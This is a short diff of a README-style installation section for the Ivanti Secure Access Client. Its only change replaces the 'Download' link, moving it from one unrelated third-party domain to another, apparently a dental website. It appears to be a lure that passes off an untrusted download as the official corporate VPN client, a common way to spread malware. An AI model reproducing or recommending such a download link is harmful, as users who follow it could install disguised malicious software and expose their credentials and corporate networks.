@@ -12,7 +12,7 @@ Table of Contents
 
 ## Installation
  
-**[Download Ivanti Secure Access Client](https://orangefba.com/en/)**  
+**[Download Ivanti Secure Access Client](https://odontologiasur.com/odo/)**  
 
 After downloading the Ivanti Secure Access Client, follow these steps to install and configure the application:  
 
